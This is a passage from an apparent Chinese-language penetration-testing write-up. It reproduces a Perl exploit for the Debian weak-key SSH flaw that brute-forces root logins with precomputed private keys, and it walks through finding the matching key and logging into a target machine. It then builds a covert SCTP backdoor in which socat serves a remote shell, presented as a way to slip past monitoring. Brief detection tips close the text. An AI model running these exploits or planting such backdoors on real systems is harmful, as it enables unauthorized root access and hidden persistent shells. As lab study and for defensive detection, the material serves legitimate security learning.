            https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2 (debian_ssh_rsa_2048_x86.tar.bz2)

2. Extract it to a directory

3. Enter into the /root/.ssh/authorized_keys a SSH RSA key with 2048
Bits, generated on an upatched debian (this is the key this exploit will
break)

4. Run the perl script and give it the location to where you extracted
the bzip2 mentioned.

#!/usr/bin/perl
my $keysPerConnect = 6;
unless ($ARGV[1]) {
   print "Syntax : ./exploiter.pl pathToSSHPrivateKeys SSHhostToTry\n";
   print "Example: ./exploiter.pl /root/keys/ 127.0.0.1\n";
   print "By mm@deadbeef.de\n";
   exit 0;
}
chdir($ARGV[0]);
opendir(A, $ARGV[0]) || die("opendir");
while ($_ = readdir(A)) {
   chomp;
   next unless m,^\d+$,;
   push(@a, $_);
   if (scalar(@a) > $keysPerConnect) {
      system("echo ".join(" ", @a)."; ssh -l root ".join(" ", map { "-i
".$_ } @a)." ".$ARGV[1]);
      @a = ();
   }
}

5. Enjoy the shell after some minutes (less than 20 minutes)

Regards,
Markus Mueller
mm@deadbeef.de

# milw0rm.com [2008-05-15]
```

```bash
现在的思路是拿到了公钥，需要私钥进行提权，这里用的是私钥库进行碰撞，ssh的非堆成加密算法中涉及到PRNG机制，可以用伪随机数生成密钥来进行碰撞，碰撞成功则能够登录靶机

1、下载文件
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2
2、解压缩
sudo tar vjxf 5622.tar.bz2
# v：表示详细模式（verbose），在解压缩过程中显示详细信息
# j：表示要解压缩的文件是使用 bzip2 压缩算法压缩的
# x：表示执行解压缩操作
# f：表示接下来的参数是要操作的文件

# 在碰撞的时候公钥取值不要太长或太短，太长则匹配速度慢，太短可能匹配到多个文件，一般30-40个字符内容即可
grep -lr "RSA公钥部分内容"
# l：将匹配到的内容输出
# r：递归搜索
# 搜索到的结果是公钥.pub文件，其对应的私钥是没有后缀的文件，得到私钥后，可以保存为key后进行登录
sudo ssh -i 私钥文件 用户@IP
```

```bash
PS：
1、Unable to negotiate with 10.1.239.136 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
不能和这台机器在25端口进行写上，因为有主键类型未被发现，这里使用下面的命令，加上密钥类型ssh-rsa,ssh-dss
sudo ssh -i 私钥文件 用户@IP -oHostKeyAlgorithms=ssh-rsa,ssh-dss

2、发现还是需要密码
sudo ssh -i 私钥文件 用户@IP -oHostKeyAlgorithms=ssh-rsa,ssh-dss -vv
使用-vv参数查看调试信息
debug1: Trying private key: dcbe2a56e8cdea6d17495f6648329ee2-4679
sign_and_send_pubkey: no mutual signature supported
debug2: we did not send a packet, disable method
debug1: Next authentication method: password
# 没有共同签名的支持，这里使用-oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss，公钥能够接受的密钥类型
sudo ssh -i 私钥文件 用户@IP -oHostKeyAlgorithms=ssh-rsa,ssh-dss -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss
# 成功登录
```

## SCTP协议后门

SCTP协议在Linux上的应用主要为电信行业提供可靠通信。虽然它有合法用途，但也可能成为一种隐蔽的方式，用于访问Linux系统并规避检测。很多团队可能不会监控这种类型的流量，而数据包过滤器也会因配置错误导致其绕过防火墙。

此外，SCTP在大量Linux系统上默认启用，但很少被实际使用, 这为恶意行为提供了可乘之机。特别是如果不是电信企业，在网络中看到SCTP流量可能就是一个危险信号，如果是电信企业，恶意SCTP流量则可能轻易混入正常流量，同样也需要监控。

socat, 这是一款强大的命令行工具, 用于在两个数据流(sockets、文件、设备等)之间建立双向通道。

```scss
# ubuntu系统中,可以使用以下命令安装:
apt install socat -y
```

使用socat命令配合SCTP协议构建一个简单的SCTP后门，攻击是通过SCTP协议进行的，如果安全团队没有专门监控此协议的流量,很可能会忽略它。在本示例中为了演示，仅执行id命令，然后断开连接。实际应用中，socat命令通常会将攻击者连接到完整的系统Shell。

```scss
socat SCTP-Listen:1177,fork EXEC:/usr/bin/id

socat SCTP-Listen:1177,fork EXEC:/usr/bin/sh
```

该命令的作用是：在本地监听SCTP协议的1177端口，一旦有连接建立，就执行/usr/bin/id命令，并把命令的输出结果通过SCTP发送回客户端。

另找一台机器, 利用socat连接1177命令:

```scss
socat - SCTP:10.1.239.148:1177
```

如果运行`netstat`或`ss`等Linux命令，并使用常见参数，是看不到这类端口的，下面运行了命令：`ss -ltun`来列出所有监听的TCP和UDP端口，注意, SCTP后门并不在其中。

可以使用`ss -l`选项列出所有监听的套接字，但这样会输出大量数据，一个快捷方式是使用：`ss -lStu`，它会专门包括SCTP以及正在监听的TCP/UDP端口。

### 检查SCTP是否启用

由于很多Linux系统默认启用了SCTP，你可能想知道如何检查你的系统是否启用了它。首先，可以使用以下命令检查内核模块是否已加载

```
lsmod | grep sctp
```

接下来可以检查`/proc/net/protocols`，确认其中是否列出了SCTP协议

最后，可以检查`/proc/net/sctp/eps`，查看有哪些套接字在使用该协议。基本上如果在这里看到内容，但在系统工具中没有显示，那就可能是某些内容在隐藏。
